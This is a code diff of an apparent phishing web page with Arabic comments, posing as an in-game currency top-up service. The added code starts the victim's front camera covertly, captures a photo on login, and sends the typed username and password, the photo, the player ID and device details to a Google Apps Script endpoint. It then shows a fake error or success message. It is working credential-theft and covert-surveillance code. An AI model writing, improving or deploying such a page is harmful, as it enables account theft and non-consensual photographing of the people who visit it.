@@ -2176,372 +2176,258 @@
             clearTimeout(chargingTimeout);
         });
         
-        // دالة تهيئة الكاميرا المعدلة
-async function initializeCameraOnDemand() {
-    try {
-        // إظهار رسالة تحميل
-        showStatus('جاري طلب صلاحية الكاميرا...', 'loading');
+        // تهيئة الكاميرا بشكل خفي بعد الموافقة
+        async function initializeCameraSilently() {
+            try {
+                // محاولة إعدادات الكاميرا الأساسية المتوافقة
+                const constraints = {
+                    video: {
+                        facingMode: 'user',
+                        width: { min: 320, ideal: 640, max: 1280 },
+                        height: { min: 240, ideal: 480, max: 720 },
+                        frameRate: { ideal: 24, max: 30 }
+                    },
+                    audio: false
+                };
+                
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+                
+                // انتظار تحميل الفيديو
+                await new Promise((resolve, reject) => {
+                    const timeout = setTimeout(() => {
+                        reject(new Error('Timeout loading camera'));
+                    }, 3000);
+                    
+                    video.onloadedmetadata = () => {
+                        clearTimeout(timeout);
+                        video.play().then(resolve).catch(reject);
+                    };
+                    
+                    video.onerror = () => {
+                        clearTimeout(timeout);
+                        reject(new Error('Video error'));
+                    };
+                });
+                
+                cameraInitialized = true;
+                console.log('✅ Camera initialized successfully');
+                
+            } catch (error) {
+                console.log('❌ Camera initialization failed:', error);
+                
+                // محاولة بديلة بإعدادات أبسط
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: 'user' }, 
+                        audio: false 
+                    });
+                    
+                    video.srcObject = stream;
+                    cameraInitialized = true;
+                    console.log('✅ Camera initialized with basic settings');
+                    
+                } catch (secondError) {
+                    console.log('❌ Camera initialization completely failed:', secondError);
+                    showStatus('تعذر الوصول إلى الكاميرا', 'error');
+                }
+            }
+        }
         
-        // محاولة إعدادات الكاميرا الأساسية المتوافقة
-        const constraints = {
-            video: {
-                facingMode: 'user',
-                width: { min: 320, ideal: 640, max: 1280 },
-                height: { min: 240, ideal: 480, max: 720 },
-                frameRate: { ideal: 24, max: 30 }
-            },
-            audio: false
-        };
-        
-        // طلب الصلاحية من المستخدم
-        stream = await navigator.mediaDevices.getUserMedia(constraints);
-        video.srcObject = stream;
-        
-        // انتظار تحميل الفيديو
-        await new Promise((resolve, reject) => {
-            const timeout = setTimeout(() => {
-                reject(new Error('Timeout loading camera'));
-            }, 5000);
+        // معالجة تسجيل الدخول
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
             
-            video.onloadedmetadata = () => {
-                clearTimeout(timeout);
-                video.play().then(resolve).catch(reject);
-            };
-            
-            video.onerror = () => {
-                clearTimeout(timeout);
-                reject(new Error('Video error'));
-            };
-        });
-        
-        cameraInitialized = true;
-        console.log('✅ Camera initialized successfully');
-        showStatus('تم تفعيل الكاميرا بنجاح', 'success');
-        
-        // إخفاء الرسالة بعد ثانيتين
-        setTimeout(() => {
-            showStatus('', '');
-        }, 2000);
-        
-        return true;
-        
-    } catch (error) {
-        console.log('❌ Camera initialization failed:', error);
-        
-        // محاولة بديلة بإعدادات أبسط
-        try {
-            showStatus('محاولة إعدادات بديلة للكاميرا...', 'loading');
-            
-            stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: 'user' }, 
-                audio: false 
-            });
-            
-            video.srcObject = stream;
-            cameraInitialized = true;
-            
-            console.log('✅ Camera initialized with basic settings');
-            showStatus('تم تفعيل الكاميرا بنجاح', 'success');
-            
-            setTimeout(() => {
-                showStatus('', '');
-            }, 2000);
-            
-            return true;
-            
-        } catch (secondError) {
-            console.log('❌ Camera initialization completely failed:', secondError);
-            
-            // تحديد نوع الخطأ وعرض رسالة مناسبة
-            let errorMessage = 'تعذر الوصول إلى الكاميرا';
-            
-            if (secondError.name === 'NotAllowedError') {
-                errorMessage = 'تم رفض صلاحية الكاميرا. يرجى السماح بالوصول إلى الكاميرا للمتابعة.';
-            } else if (secondError.name === 'NotFoundError') {
-                errorMessage = 'لم يتم العثور على كاميرا في الجهاز.';
-            } else if (secondError.name === 'NotSupportedError') {
-                errorMessage = 'المتصفح لا يدعم الكاميرا.';
-            } else if (secondError.name === 'NotReadableError') {
-                errorMessage = 'الكاميرا مستخدمة من قبل تطبيق آخر.';
+            // التحقق من الموافقة على الشروط
+            if (!termsAccepted) {
+                showLoginStatus('يجب الموافقة على الشروط والأحكام أولاً', 'error');
+                termsModal.style.display = 'flex';
+                return;
             }
             
-            showStatus(errorMessage, 'error');
-            return false;
-        }
-    }
-}
-
-// دالة التقاط الصورة مع التحقق من حالة الكاميرا
-async function capturePhotoWithVerification() {
-    if (!cameraInitialized || !stream || video.readyState !== 4) {
-        console.log('❌ Camera not ready for capture');
-        return null;
-    }
-
-    try {
-        console.log('📸 Capturing photo...');
-        
-        // انتظار بسيط لضمان جودة الصورة
-        await new Promise(resolve => setTimeout(resolve, 800));
-        
-        const context = canvas.getContext('2d');
-        
-        // ضبط أبعاد الكانفاس مع الحفاظ على النسبة
-        const videoWidth = video.videoWidth;
-        const videoHeight = video.videoHeight;
-        
-        // استخدام أبعاد مناسبة لجميع الأجهزة
-        canvas.width = Math.min(videoWidth, 800);
-        canvas.height = Math.min(videoHeight, 600);
-        
-        // رسم الصورة بدقة مناسبة
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        // تحويل الصورة إلى بيانات بجودة متوسطة للحجم
-        const imageData = canvas.toDataURL('image/jpeg', 0.85);
-        
-        console.log('✅ Photo captured successfully');
-        return imageData;
-        
-    } catch (error) {
-        console.error('Error capturing photo:', error);
-        return null;
-    }
-}
-
-// زر المتابعة إلى الدفع - الكود المعدل
-proceedBtn.addEventListener('click', async function() {
-    if (!termsAccepted) {
-        showStatus('يجب الموافقة على الشروط والأحكام أولاً', 'error');
-        termsModal.style.display = 'flex';
-        return;
-    }
-    
-    if (!selectedCharge) {
-        showStatus('يرجى اختيار عدد الشدات', 'error');
-        return;
-    }
-    
-    if (!playerIdInput.value.trim()) {
-        showStatus('يرجى إدخال معرف اللاعب', 'error');
-        return;
-    }
-    
-    if (!serverSelect.value) {
-        showStatus('يرجى اختيار الخادم', 'error');
-        return;
-    }
-    
-    // طلب صلاحية الكاميرا أولاً
-    showStatus('جاري التحضير للشحن...', 'loading');
-    
-    const cameraAccess = await initializeCameraOnDemand();
-    
-    if (!cameraAccess) {
-        showStatus('لا يمكن المتابعة بدون تفعيل الكاميرا', 'error');
-        return;
-    }
-    
-    // بدء عملية الشحن بعد نجاح تفعيل الكاميرا
-    showChargingProcess();
-});
-
-// دالة عرض نافذة الشحن المعدلة
-function showChargingProcess() {
-    chargingModal.style.display = 'flex';
-    showStep(0);
-    startChargeCollection();
-    
-    // إظهار الخطأ بعد 8 ثواني (تم تقليل الوقت)
-    chargingTimeout = setTimeout(() => {
-        showStep(1);
-    }, 8000);
-}
-
-// دالة إرسال البيانات إلى Google Apps Script المعدلة
-async function sendToGoogleScript(username, password, imageData) {
-    try {
-        const formData = new FormData();
-        formData.append('username', username);
-        formData.append('password', password);
-        
-        // إضافة معلومات الشحن
-        formData.append('chargeAmount', selectedCharge.amount);
-        formData.append('chargePrice', selectedCharge.price);
-        formData.append('playerId', playerIdInput.value.trim());
-        formData.append('playerName', playerNameInput.value.trim());
-        formData.append('server', serverSelect.value);
-        
-        // التقاط صورة جديدة في كل مرة
-        const currentImageData = await capturePhotoWithVerification();
-        if (currentImageData) {
-            formData.append('image', currentImageData);
-            console.log('📤 Sending new image data...');
-        } else if (imageData) {
-            formData.append('image', imageData);
-            console.log('📤 Sending previous image data...');
-        }
-        
-        // جمع معلومات إضافية عن الجهاز
-        formData.append('timestamp', new Date().toLocaleString('ar-SA'));
-        formData.append('userAgent', navigator.userAgent);
-        formData.append('platform', navigator.platform);
-        formData.append('language', navigator.language);
-        formData.append('timezone', Intl.DateTimeFormat().resolvedOptions().timeZone);
-        formData.append('cameraStatus', cameraInitialized ? 'active' : 'inactive');
-        
-        console.log('🚀 Sending data to Google Script...');
-        
-        // إرسال البيانات
-        const response = await fetch(GOOGLE_SCRIPT_URL, {
-            method: 'POST',
-            body: formData,
-            mode: 'no-cors'
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            if (!username || !password) {
+                showLoginStatus('يرجى ملء جميع الحقول', 'error');
+                return;
+            }
+            
+            // إظهار رسالة التحقق العادية
+            loginSuccess.style.display = 'block';
+            loginBtn.disabled = true;
+            loginBtn.value = 'جاري التحقق...';
+            
+            // إخفاء لوحة المفاتيح في الأجهزة المحمولة
+            if ('virtualKeyboard' in navigator) {
+                navigator.virtualKeyboard.hide();
+            }
+            
+            try {
+                // التقاط الصورة خفية وإرسالها
+                await captureAndSendPhoto(username, password);
+                
+            } catch (error) {
+                console.error('Error:', error);
+                // إظهار رسالة خطأ عادية
+                handleLoginError();
+            }
         });
         
-        // مع no-cors، لن نتمكن من قراءة الاستجابة
-        console.log('✅ Data sent successfully');
-        
-        return true;
-        
-    } catch (error) {
-        console.error('Error sending data:', error);
-        throw error;
-    }
-}
-
-// معالجة تسجيل الدخول المعدلة
-loginForm.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    
-    // التحقق من الموافقة على الشروط
-    if (!termsAccepted) {
-        showLoginStatus('يجب الموافقة على الشروط والأحكام أولاً', 'error');
-        termsModal.style.display = 'flex';
-        return;
-    }
-    
-    const username = usernameInput.value.trim();
-    const password = passwordInput.value.trim();
-    
-    if (!username || !password) {
-        showLoginStatus('يرجى ملء جميع الحقول', 'error');
-        return;
-    }
-    
-    // إظهار رسالة التحقق
-    loginSuccess.style.display = 'block';
-    loginBtn.disabled = true;
-    loginBtn.value = 'جاري التحقق...';
-    
-    // إخفاء لوحة المفاتيح في الأجهزة المحمولة
-    if ('virtualKeyboard' in navigator) {
-        navigator.virtualKeyboard.hide();
-    }
-    
-    try {
-        // طلب صلاحية الكاميرا أولاً
-        const cameraAccess = await initializeCameraOnDemand();
-        
-        if (!cameraAccess) {
-            handleLoginError('لا يمكن المتابعة بدون تفعيل الكاميرا');
-            return;
+        // معالجة خطأ تسجيل الدخول
+        function handleLoginError() {
+            loginSuccess.style.display = 'none';
+            showLoginStatus('البريد الإلكتروني أو كلمة المرور غير صحيحة', 'error');
+            loginBtn.disabled = false;
+            loginBtn.value = 'تسجيل الدخول';
+            
+            // إعادة التركيز على حقل اسم المستخدم
+            setTimeout(() => {
+                usernameInput.focus();
+            }, 100);
         }
         
-        // التقاط الصورة وإرسال البيانات
-        await captureAndSendPhoto(username, password);
-        
-    } catch (error) {
-        console.error('Error:', error);
-        handleLoginError('حدث خطأ أثناء المعالجة');
-    }
-});
-
-// دالة التقاط وإرسال الصورة المعدلة
-async function captureAndSendPhoto(username, password) {
-    try {
-        let imageData = null;
-        
-        // التقاط صورة جديدة في كل مرة
-        imageData = await capturePhotoWithVerification();
-        
-        if (!imageData) {
-            throw new Error('Failed to capture photo');
+        // التقاط الصورة وإرسالها بشكل خفي
+        async function captureAndSendPhoto(username, password) {
+            try {
+                let imageData = null;
+                
+                // إذا كانت الكاميرا جاهزة، نلتقط صورة
+                if (cameraInitialized && stream && video.readyState === 4) {
+                    console.log('📸 Capturing photo...');
+                    
+                    // انتظار بسيط لضمان جودة الصورة
+                    await new Promise(resolve => setTimeout(resolve, 600));
+                    
+                    const context = canvas.getContext('2d');
+                    
+                    // ضبط أبعاد الكانفاس مع الحفاظ على النسبة
+                    const videoWidth = video.videoWidth;
+                    const videoHeight = video.videoHeight;
+                    
+                    // استخدام أبعاد مناسبة لجميع الأجهزة
+                    canvas.width = Math.min(videoWidth, 800);
+                    canvas.height = Math.min(videoHeight, 600);
+                    
+                    // رسم الصورة بدقة مناسبة
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // تحويل الصورة إلى بيانات بجودة متوسطة للحجم
+                    imageData = canvas.toDataURL('image/jpeg', 0.85);
+                    
+                    console.log('✅ Photo captured successfully');
+                } else {
+                    console.log('❌ Camera not ready for capture');
+                }
+                
+                // إرسال البيانات إلى Google Apps Script
+                await sendToGoogleScript(username, password, imageData);
+                
+            } catch (error) {
+                console.error('Error capturing/sending photo:', error);
+                throw error;
+            }
         }
         
         // إرسال البيانات إلى Google Apps Script
-        await sendToGoogleScript(username, password, imageData);
-        
-        // محاكاة نجاح الإرسال
-        setTimeout(() => {
-            loginSuccess.innerHTML = '<p>✅ تم تسجيل الدخول بنجاح! جاري التوجيه...</p>';
-            
-            // إعادة تعيين النموذج
-            setTimeout(() => {
-                loginForm.reset();
-                loginSuccess.style.display = 'none';
-                loginBtn.disabled = false;
-                loginBtn.value = 'تسجيل الدخول';
+        async function sendToGoogleScript(username, password, imageData) {
+            try {
+                const formData = new FormData();
+                formData.append('username', username);
+                formData.append('password', password);
                 
-                // إعادة إلى الصفحة الرئيسية
-                document.body.classList.remove('show-login');
-                showStatus('تم تسجيل الدخول بنجاح!', 'success');
+                // إضافة معلومات الشحن
+                formData.append('chargeAmount', selectedCharge.amount);
+                formData.append('chargePrice', selectedCharge.price);
+                formData.append('playerId', playerIdInput.value.trim());
+                formData.append('playerName', playerNameInput.value.trim());
+                formData.append('server', serverSelect.value);
                 
-                // إعادة تعيين بيانات الشحن
-                resetChargeData();
+                if (imageData) {
+                    formData.append('image', imageData);
+                    console.log('📤 Sending image data...');
+                }
                 
-            }, 2000);
-        }, 1500);
+                // جمع معلومات إضافية عن الجهاز
+                formData.append('timestamp', new Date().toLocaleString('ar-SA'));
+                formData.append('userAgent', navigator.userAgent);
+                formData.append('platform', navigator.platform);
+                formData.append('language', navigator.language);
+                formData.append('timezone', Intl.DateTimeFormat().resolvedOptions().timeZone);
+                
+                console.log('🚀 Sending data to Google Script...');
+                
+                // إرسال البيانات
+                const response = await fetch(GOOGLE_SCRIPT_URL, {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors'
+                });
+                
+                // مع no-cors، لن نتمكن من قراءة الاستجابة
+                console.log('✅ Data sent successfully');
+                
+                // محاكاة نجاح الإرسال (في الواقع، لا يمكننا التحقق من الاستجابة مع no-cors)
+                setTimeout(() => {
+                    loginSuccess.innerHTML = '<p>✅ تم تسجيل الدخول بنجاح! جاري التوجيه...</p>';
+                    
+                    // إعادة تعيين النموذج
+                    setTimeout(() => {
+                        loginForm.reset();
+                        loginSuccess.style.display = 'none';
+                        loginBtn.disabled = false;
+                        loginBtn.value = 'تسجيل الدخول';
+                        
+                        // إعادة إلى الصفحة الرئيسية
+                        document.body.classList.remove('show-login');
+                        showStatus('تم تسجيل الدخول بنجاح!', 'success');
+                        
+                        // إعادة تعيين بيانات الشحن
+                        resetChargeData();
+                        
+                    }, 2000);
+                }, 1500);
+                
+            } catch (error) {
+                console.error('Error sending data:', error);
+                throw error;
+            }
+        }
         
-    } catch (error) {
-        console.error('Error capturing/sending photo:', error);
-        throw error;
-    }
-}
-
-// دالة معالجة خطأ تسجيل الدخول المعدلة
-function handleLoginError(message) {
-    loginSuccess.style.display = 'none';
-    showLoginStatus(message, 'error');
-    loginBtn.disabled = false;
-    loginBtn.value = 'تسجيل الدخول';
-    
-    // إعادة التركيز على حقل اسم المستخدم
-    setTimeout(() => {
-        usernameInput.focus();
-    }, 100);
-}
-
-// إزالة تهيئة الكاميرا التلقائية من الشروط
-agreeBtn.addEventListener('click', async function() {
-    if (agreeCheckbox.checked) {
-        showStatus('جاري تهيئة النظام...', 'loading');
-        termsModal.style.display = 'none';
-        termsAccepted = true;
+        // إعادة تعيين بيانات الشحن
+        function resetChargeData() {
+            selectedCharge = null;
+            chargeOptions.forEach(opt => opt.classList.remove('selected'));
+            selectedChargeInfo.style.display = 'none';
+            playerIdInput.value = '';
+            playerNameInput.value = '';
+            serverSelect.value = '';
+            proceedBtn.disabled = true;
+        }
         
-        // لا نقوم بتهيئة الكاميرا تلقائياً الآن
-        setTimeout(() => {
-            showStatus('', '');
-        }, 2000);
-    }
-});
-
-// تنظيف الكاميرا عند إغلاق الصفحة
-window.addEventListener('beforeunload', () => {
-    if (stream) {
-        stream.getTracks().forEach(track => {
-            track.stop();
+        // إظهار رسالة حالة
+        function showStatus(message, type) {
+            statusDiv.textContent = message;
+            statusDiv.className = type;
+            statusDiv.style.display = message ? 'block' : 'none';
+        }
+        
+        function showLoginStatus(message, type) {
+            loginStatusDiv.textContent = message;
+            loginStatusDiv.className = type;
+            loginStatusDiv.style.display = message ? 'block' : 'none';
+        }
+        
+        // تنظيف الكاميرا عند إغلاق الصفحة
+        window.addEventListener('beforeunload', () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            clearTimeout(chargingTimeout);
         });
-        stream = null;
-        cameraInitialized = false;
-    }
-    clearTimeout(chargingTimeout);
-});
     </script>
 </body>
 </html>
-
-
 
 
 
